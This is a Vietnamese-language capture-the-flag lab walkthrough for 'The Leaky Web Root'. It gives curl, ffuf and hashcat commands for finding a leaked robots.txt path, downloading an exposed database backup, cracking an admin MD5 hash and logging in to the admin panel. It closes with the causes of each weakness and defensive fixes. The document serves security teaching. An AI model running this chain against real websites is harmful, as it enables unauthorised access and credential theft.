# 🔓 Flow Khai Thác Lab Leaky Webroot

## 📋 Tổng Quan

Flow này mô tả các bước khai thác và nguyên nhân của từng hành động trong bài lab "The Leaky Web Root".

---

## 🎯 Flow Khai Thác

### 1. Truy cập website và kiểm tra robots.txt
**(Nguyên nhân: File robots.txt cấu hình sai, tiết lộ các thư mục nhạy cảm)**
```bash
curl http://[VICTIM HOST]:8081/robots.txt
```
**Kết quả:** Thấy `Disallow: /backup/`.

### 2. Liệt kê thư mục (Directory Enumeration)
**(Nguyên nhân: Web server không vô hiệu hóa khả năng liệt kê thư mục hoặc không cấu hình access control cho các đường dẫn nhạy cảm)**
```bash
ffuf -u http://[VICTIM HOST]:8081/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
**Kết quả:** Xác nhận sự tồn tại của `/backup` và `/admin`.

### 3. Tìm kiếm tệp sao lưu trong /backup (File Discovery)
**(Nguyên nhân: Thư mục chứa backup không có file index, để lộ thông tin tệp tin bên trong khi quét extension)**
```bash
ffuf -u http://[VICTIM HOST]:8081/backup/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.sql,.bak,.zip
```
**Kết quả:** Tìm thấy tệp `backup.sql`.

### 4. Tải và phân tích tệp backup.sql
**(Nguyên nhân: Tệp sao lưu database bị để lại trên webroot công khai thay vì được xóa hoặc bảo mật)**
```bash
curl http://[VICTIM HOST]:8081/backup/backup.sql -o backup.sql
```
**Kết quả:** Tìm thấy thông tin user `admin` cùng mã băm MD5: `5f4dcc3b5aa765d61d8327deb882cf99`.

### 5. Bẻ khóa MD5 Hash
**(Nguyên nhân: Sử dụng thuật toán băm yếu (MD5) có thể bị bẻ khóa (cracked) nhanh chóng bằng wordlist)**
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**Kết quả:** Tìm thấy mật khẩu là `password`.

### 6. Tìm trang đăng nhập trong /admin
**(Nguyên nhân: Thư mục quản trị bị lộ nhưng chưa rõ tên tệp tin cụ thể)**
```bash
ffuf -u http://[VICTIM HOST]:8081/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html
```
**Kết quả:** Tìm thấy trang `login.php`.

### 7. Đăng nhập và lấy Flag
**(Nguyên nhân: Sử dụng các thông tin đã thu thập được từ bước 4 và 5 để truy cập trái phép vào trang quản trị)**
**Kết quả:** Đăng nhập thành công với `admin:password`, hiển thị User Flag trên Dashboard.

---

## 🔍 Tóm Tắt Nguyên Nhân Lỗ Hổng

| Hành Động | Nguyên Nhân |
|-----------|-------------|
| **Robots.txt discovery** | Tiết lộ đường dẫn thư mục ẩn cho attacker |
| **Directory Enumeration** | Thư mục `/backup` và `/admin` thiếu cơ chế bảo mật |
| **Sensitive Backup Leak** | Tệp tin database quan trọng bị lưu trên webserver công khai |
| **Weak Hash Algorithm** | Sử dụng MD5 dễ bị bẻ khóa bằng brute-force/dictionary attack |
| **Insecure Admin Panel** | Trang quản trị không được ẩn hoặc bảo vệ bằng các lớp bảo mật khác (như IP restriction) |

---

## ⚠️ Các Lỗ Hổng Chính

1. **Information Leakage via robots.txt** → Giúp kẻ tấn công thu hẹp phạm vi tấn công.
2. **Sensitive Database Backup publicly accessible** → Nguồn gốc của các rò rỉ thông tin nhạy cảm nhất.
3. **Use of Broken/Weak Cryptographic Hash (MD5)** → Làm mật khẩu trở nên vô dụng nếu tệp băm bị lộ.
4. **Lack of Rate Limiting on Admin Login** → (Mặc dù chưa khai thác brute-force login trực tiếp nhưng trang login vẫn tồn tại rủi ro).

---

## 🛡️ Cách Phòng Chống

1. ✅ **Cấu hình Robots.txt cẩn thận**: Không nên để các đường dẫn nhạy cảm vào `robots.txt` vì đây là nguồn tin tốt cho kẻ tấn công (thay vào đó dùng cấu hình server như Apache/Nginx để chặn).
2. ✅ **Xóa tệp sao lưu khỏi Webroot**: Các bản sao lưu database không bao giờ được phép nằm trong thư mục web công khai.
3. ✅ **Sử dụng thuật toán băm mật khẩu mạnh**: Thay đổi MD5 sang các thuật toán như Argon2, BCrypt hoặc SCrypt kèm theo Salt.
4. ✅ **Bảo vệ thư mục Admin**: Giới hạn truy cập trang quản trị theo IP hoặc sử dụng thêm lớp xác thực (Ví dụ: `.htaccess` password protection).
5. ✅ **Tắt tính năng directory listing**: Đảm bảo người dùng không thể liệt kê các tệp tin trong thư mục nếu không có tệp `index`.

---

**Flow này minh họa cách một chuỗi các sai sót nhỏ (misconfigurations) có thể dẫn đến việc rò rỉ toàn bộ thông tin đăng nhập quản trị.**
